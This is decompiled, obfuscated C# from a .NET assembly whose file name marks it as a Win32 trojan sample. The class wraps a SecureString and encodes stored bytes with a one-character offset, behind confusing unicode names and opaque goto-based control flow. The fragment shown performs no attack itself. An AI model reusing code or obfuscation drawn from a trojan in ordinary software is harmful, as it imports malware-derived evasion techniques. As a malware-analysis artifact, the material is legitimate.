// Decompiled with JetBrains decompiler
// Type:  
// Assembly: Vqblspvdqljhpsgi, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FE8081E8-66FB-4850-FD50-A5695502DCE6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\VHO-Trojan.Win32.Sdum.gen-9fc4a8a3b82ca7cc67d3b4eed5450d9c6ff148924beec86be1b3178754f4b645.exe

using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;

internal sealed class \u0002\u2009 : \u000E\u2007, IDisposable
{
  private SecureString \u0002;

  public \u0002\u2009()
  {
    SecureString secureString = new SecureString();
    if (true)
      goto label_2;
label_1:
    // ISSUE: explicit constructor call
    base.\u002Ector();
    return;
label_2:
    this.\u0002 = secureString;
    goto label_1;
  }

  [SpecialName]
  public int \u000E\u2007\u2009​\u0002()
  {
    if (true)
      ;
    return this.\u0002.Length;
  }

  public \u000E\u2007 \u000E\u2007\u2009​\u0002() => (\u000E\u2007) new \u0002\u2009();

  public void \u000E\u2007\u2009​\u0002(int _param1, out byte _param2)
  {
    if (_param1 < 0 || _param1 >= this.\u000E\u2007\u2009​\u0002())
      throw new ArgumentOutOfRangeException();
    IntPtr zero = IntPtr.Zero;
    if (true)
      goto label_4;
label_3:
    char ch;
    if (true)
      ch = char.MinValue;
    IntPtr num;
    try
    {
      IntPtr globalAllocUnicode = Marshal.SecureStringToGlobalAllocUnicode(this.\u0002);
      if (true)
        goto label_8;
label_7:
      ch = (char) Marshal.ReadInt16(num, _param1 * 2);
      _param2 = \u0002\u2009.\u0002(ch, _param1);
      return;
label_8:
      num = globalAllocUnicode;
      goto label_7;
    }
    finally
    {
      \u000E\u2008.\u0002(ref ch);
      if (num != IntPtr.Zero)
        Marshal.ZeroFreeGlobalAllocUnicode(num);
    }
label_4:
    num = zero;
    goto label_3;
  }

  public void \u000E\u2007\u2009​\u0003(int _param1, ref byte _param2)
  {
    int length = this.\u0002.Length;
    int num1;
    if (true)
      num1 = length;
    while (num1 <= _param1)
    {
      if (num1 == _param1)
      {
        this.\u0002.AppendChar(\u0002\u2009.\u0002(_param2, num1));
        return;
      }
      this.\u0002.AppendChar(\u0002\u2009.\u0002((byte) 0, num1));
      int num2 = num1 + 1;
      if (true)
        num1 = num2;
    }
    this.\u0002.SetAt(_param1, \u0002\u2009.\u0002(_param2, _param1));
  }

  private static char \u0002(byte _param0, int _param1)
  {
    int num = (int) _param0;
    if (true)
      ;
    return (char) (num + 1);
  }

  private static byte \u0002(char _param0, int _param1)
  {
    int num = (int) _param0;
    if (true)
      ;
    return (byte) (num - 1);
  }

  public void \u000E\u2007\u2009​\u0002()
  {
    if (true)
      ;
    this.\u0002.Clear();
  }

  public void Dispose()
  {
    this.\u0002.Dispose();
    if (false)
      return;
    this.\u0002 = (SecureString) null;
  }
}
